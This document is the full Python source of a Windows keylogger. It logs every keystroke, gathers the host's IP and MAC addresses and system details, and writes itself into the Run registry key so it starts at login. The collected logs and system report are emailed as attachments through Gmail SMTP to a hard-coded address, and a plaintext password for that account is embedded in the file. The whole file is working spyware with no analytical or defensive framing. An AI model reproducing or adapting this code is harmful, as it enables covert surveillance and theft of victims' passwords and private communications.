from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from datetime import datetime
from pynput.keyboard import Key, Listener
from requests import get
import time
import os
import winreg
import psutil
import uuid
import re

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
file_path = os.path.abspath(os.getcwd())
extend = "\\"
count = 0
count_press = 0
keys = []
email_address = "k3yl00g3r444@gmail.com"
toaddr = "k3yl00g3r444@gmail.com"
password = "amlfuahzumbkooxi"


def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = str(time.ctime(time.time()))
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        swap = psutil.swap_memory()
        f.write(f"Time:{current_time()}\n\n")
        try:
            publicIP = get("https://api.ipify.org").text
            f.write(f"""        Public IP Address {publicIP}""")
        except Exception:
            f.write("Couldn't get Public IP Address")
        f.write(f"""
        Private IP Address: {socket.gethostbyname(socket.gethostname())}
        Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n""")
    
        f.write(f"""
        CPU: {platform.processor()}
        System: {platform.system()} {platform.version()}
        Machine: {platform.machine()}
        Hostname: {socket.gethostname()}
        Total: {get_size(swap.total)}
        Free: {get_size(swap.free)}
        Used: {get_size(swap.used)}
        Percentage: {swap.percent}\n\n""")
        
        f.write("----------------INTETFACE ADDRESS--------------------\n")
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                f.write((f"=== Interface: {interface_name} ===\n"))
                if str(address.family) == 'AddressFamily.AF_INET':
                    f.write((f"""  
                    IP Address: {address.address}
                    Netmask: {address.netmask}
                    Broadcast IP: {address.broadcast}\n\n"""))
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    f.write((f"""  
                    MAC Address: {address.address}
                    Netmask: {address.netmask}
                    Broadcast MAC: {address.broadcast}\n\n"""))
                  
        f.write("------------------------------------\n")


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def on_press(key):
    global keys, count, count_press
    keys.append(key)
    count += 1
    count_press += 1
    print(count_press)
    if count >= 1:
        write_file(keys)
        count = 0
        keys = []


def on_release(key):
    global count_press
    print(f"reset : {count_press}")
    if count_press == 100:
        send_email(keys_information, file_path +
                   extend + keys_information, toaddr)
        count_press = 0

    elif key == Key.esc:
        return False


def write_file(keys):

    substitution = ['Key.enter', '[ENTER]\n',
                    'Key.backspace', '[BACKSPACE]',
                    'Key.space', ' ',
                    'Key.alt_l', '[ALT]',
                    'Key.tab', '[TAB]',
                    'Key.delete', '[DEL]',
                    'Key.ctrl_l', '[CTRL]',
                    'Key.left', '[LEFT ARROW]',
                    'Key.right', '[RIGHT ARROW]',
                    'Key.shift', '[SHIFT]',
                    '\\x13', '[CTRL-S]',
                    '\\x17', '[CTRL-W]',
                    'Key.caps_lock', '[CAPS LK]',
                    '\\x01', '[CTRL-A]',
                    'Key.cmd', '[WINDOWS KEY]',
                    'Key.print_screen', '[PRNT SCR]',
                    '\\x03', '[CTRL-C]',
                    '\\x16', '[CTRL-V]']

    with open(file_path + extend + keys_information, "a") as f:
        for ind, key in enumerate(keys):
            if str(key) in substitution:
                key = substitution[substitution.index(str(keys[ind]))+1]
                f.write(key)
            else:
                f.write(str(key).replace("'", ""))


def delte_file():
    try:
        os.remove(os.path.abspath(os.getcwd()) + '\\' + system_information)
        os.remove(os.path.abspath(os.getcwd()) + '\\' + keys_information)
    except:
        pass


def current_time():
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    return dt_string


def add_to_registry():
    s_name = "keylogger.exe"
    address = os.path.abspath(os.getcwd()) + '\\' + s_name
    print(address)
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    open = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                          key_value, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(open, "KEYLOGGER", 0, winreg.REG_SZ, address)
    winreg.CloseKey(open)


def main(check):
    if check:
        try:
            add_to_registry()
            computer_information()
            send_email(system_information, file_path +
                       extend + system_information, toaddr)
            check = False
        except:
            pass
    # while True:
    #     with Listener(on_press=on_press, on_release=on_release) as listener:
    #         listener.join()

    #     delte_file()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    delte_file()


if __name__ == '__main__':
    check = True
    main(check)
